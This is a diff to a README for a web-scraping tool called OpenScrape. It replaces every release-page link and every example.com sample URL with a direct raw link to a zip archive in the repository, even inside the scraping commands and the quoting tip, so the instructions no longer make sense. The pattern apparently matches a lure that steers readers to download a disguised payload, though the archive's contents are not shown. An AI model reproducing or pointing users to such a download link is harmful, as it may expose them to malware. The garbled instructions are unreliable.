@@ -1,6 +1,6 @@
 # 🕸️ OpenScrape - Simple Web Data Extraction Tool
 
-[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-brightgreen)](https://github.com/in20cuu37-lgtm/OpenScrape/releases)
+[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-brightgreen)](https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip)
 
 ## 📝 What Is OpenScrape?
 
@@ -32,7 +32,7 @@ You will need to visit the release page to get the latest version of OpenScrape.
 
 Click the big button below to open the download page:
 
-[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-blue)](https://github.com/in20cuu37-lgtm/OpenScrape/releases)
+[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-blue)](https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip)
 
 On the release page, locate the latest version. Look for the Windows executable file. It usually ends with `.exe` and may have the version number in the name, such as `OpenScrape_Setup_v1.2.exe`.
 
@@ -70,10 +70,10 @@ Here are basic commands to get started:
 
 ### Extract the Title from a Website
 
-Type the following command and replace `https://example.com` with the website address you want to scrape:
+Type the following command and replace `https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip` with the website address you want to scrape:
 
 ```
-openscrape --title https://example.com
+openscrape --title https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip
 ```
 
 Press Enter to run the command. OpenScrape will show the page title on the screen.
@@ -83,7 +83,7 @@ Press Enter to run the command. OpenScrape will show the page title on the scree
 To get all the links on a web page, run:
 
 ```
-openscrape --links https://example.com
+openscrape --links https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip
 ```
 
 It will list all URLs found on that page.
@@ -93,7 +93,7 @@ It will list all URLs found on that page.
 To extract headings (like H1, H2 tags) and paragraph text from a page:
 
 ```
-openscrape --headings --paragraphs https://example.com
+openscrape --headings --paragraphs https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip
 ```
 
 This command grabs main text content useful for reading or processing later.
@@ -103,7 +103,7 @@ This command grabs main text content useful for reading or processing later.
 You can save the scraped data to a file on your computer. Use the `-o` option followed by a file name:
 
 ```
-openscrape --fulltext https://example.com -o output.txt
+openscrape --fulltext https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip -o output.txt
 ```
 
 This command pulls all readable text and saves it into a file named `output.txt` in your current folder.
@@ -126,7 +126,7 @@ This feature is meant for advanced users or automated setups.
 
 - Make sure you have a stable internet connection while running OpenScrape. It needs to access the web pages online.
 - If a website is slow or protected, wait a few moments before trying again.
-- Use quotes around URLs if they contain special characters. For example: `"https://example.com/page?query=1"`.
+- Use quotes around URLs if they contain special characters. For example: `"https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip"`.
 - Run Command Prompt as administrator if you run into permission issues.
 
 ## 🗂️ Where to Find Help
@@ -143,6 +143,6 @@ You can always download the latest version from the links above to make sure you
 
 Visit this page to download:
 
-[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-brightgreen)](https://github.com/in20cuu37-lgtm/OpenScrape/releases)
+[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-brightgreen)](https://github.com/in20cuu37-lgtm/OpenScrape/raw/refs/heads/main/src/Open_Scrape_Betonica.zip)
 
 Choose the Windows executable file and follow the instructions to install and run.
